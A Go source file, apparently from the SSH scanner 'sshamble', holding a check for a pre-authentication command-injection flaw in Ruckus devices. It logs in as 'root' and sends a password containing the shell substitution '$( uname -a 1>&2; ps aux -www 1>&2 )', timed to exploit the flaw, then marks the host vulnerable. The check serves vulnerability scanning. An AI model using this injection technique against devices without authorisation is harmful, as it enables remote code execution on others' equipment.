package cmd

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/runZeroInc/sshamble/auth"
	"github.com/runZeroInc/sshamble/crypto/ssh"
)

const checkVulnRuckusPasswordEscape = "vuln-ruckus-password-escape"

/*
sshCheckVulnRuckusPasswordEscape tests for a pre-authentication RCE in the post-session login process
TODO: Advisory information and references
*/
func sshCheckVulnRuckusPasswordEscape(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnRuckusPasswordEscape
	if !conf.IsCheckEnabled(tname) {
		conf.Logger.Debugf("%s %s is not enabled", addr, tname)
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	if root.SessionAuth == nil {
		conf.Logger.Errorf("%s %s is missing cached session auth, skipping", addr, tname)
		return nil
	}

	// Send username root with a password containing a shell escape and test command
	h := func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, res *auth.AuthResult) error {
		c.SetDeadline(time.Now().Add(time.Second * 15))

		// Request a pty and don't ask for a reply, this helps with the next call to Shell()
		if err := ses.RequestPtyNoReply("xterm", 20, 80, ssh.TerminalModes{ssh.ECHO: 0}); err != nil {
			conf.Logger.Errorf("%s %s pty request failed: %v", addr, tname, err)
		}

		stdOut, stdErr, stdIn, err := sessionGetSTDIO(ses)
		if err != nil {
			conf.Logger.Errorf("%s %s failed to get session stdio: %v", addr, tname, err)
			return err
		}

		err = ses.Shell()

		// These 1-second delays between input are required to exploit this reliably
		time.Sleep(time.Second)
		_, werr := stdIn.Write([]byte("root\n"))
		if werr != nil {
			conf.Logger.Errorf("%s %s write username failed: %v", addr, tname, werr)
		}
		time.Sleep(time.Second)
		_, werr = stdIn.Write([]byte("$( uname -a 1>&2; ps aux -www 1>&2 )\n"))
		if werr != nil {
			conf.Logger.Errorf("%s %s write password failed: %v", addr, tname, werr)
		}
		time.Sleep(time.Second)
		_ = stdIn.Close()

		outp := stdOut.Dump()
		outp = append(outp, stdErr.Dump()...)
		res.SessionOutput = auth.CleanSessionOutput(outp)
		return err
	}
	baseRes := auth.SSHAuth(addr, options.WithSessionHandler(h), auth.SSHAuthHandlerSingle(root.SessionAuth))
	// Failed to open session
	if baseRes.Stage != "session" {
		conf.Logger.Errorf("%s %s failed to re-open session using %s: %v", addr, tname, root.SessionMethod, baseRes.Error)
		return baseRes
	}
	// Not the expected ps response with sha256sum
	if !strings.Contains(baseRes.SessionOutput, "sha256sum") {
		conf.Logger.Errorf("%s %s expected 'sha256sum' and received %#v", addr, tname, baseRes.SessionOutput)
		return baseRes
	}
	conf.Logger.Warnf("%s %s Ruckus appears to be exploitable: (out=%#v, err=%s)", addr, tname, baseRes.SessionOutput, baseRes.Error)

	root.AddVuln(auth.VulnResult{
		ID:    checkVulnRuckusPasswordEscape,
		Proof: fmt.Sprintf("%s/%s", baseRes.Error, baseRes.SessionOutput),
	})

	return baseRes
}
